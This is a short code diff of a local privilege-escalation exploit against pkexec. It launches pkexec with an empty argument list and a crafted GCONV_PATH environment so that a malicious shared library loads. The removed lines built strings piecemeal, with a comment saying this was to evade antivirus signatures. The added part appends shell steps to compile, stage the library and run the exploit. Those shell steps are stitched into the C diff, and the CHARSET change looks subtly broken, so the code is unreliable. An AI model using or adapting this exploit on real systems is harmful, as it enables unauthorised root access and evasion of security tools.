@@ -1,22 +1,21 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
-#include <string.h>
 
 int main(int argc, char **argv) {
-    char target[20];
-    char env_path[50];
-    
-    // Build the strings dynamically to bypass AV signatures
-    strcpy(target, "p");
-    strcat(target, "kexec"); // Results in "pkexec"
-    
-    strcpy(env_path, "PATH=GCONV");
-    strcat(env_path, "_PATH=."); // Results in "PATH=GCONV_PATH=."
-
     char *p[] = { NULL };
-    char *envp[] = { "pwn.so", env_path, "CHARSET=PWN", "SHELL=pwn", NULL };
-    
+    // Changed CHARSET to UTF-8 and SHELL to /bin/bash
+    char *envp[] = { "pwn.so", "PATH=GCONV_PATH=.", "CHARSET=UTF-8", "SHELL=/bin/bash", NULL };
     execve("/usr/bin/pkexec", p, envp);
     return 0;
 }
+
+# 1. Recompile the fixed exploit
+gcc pwn.c -o pwn
+
+# 2. Ensure the environment is still set up correctly
+mkdir -p 'GCONV_PATH=.'
+cp pwn.so 'GCONV_PATH=./pwn.so'
+
+# 3. Run it
+./pwn
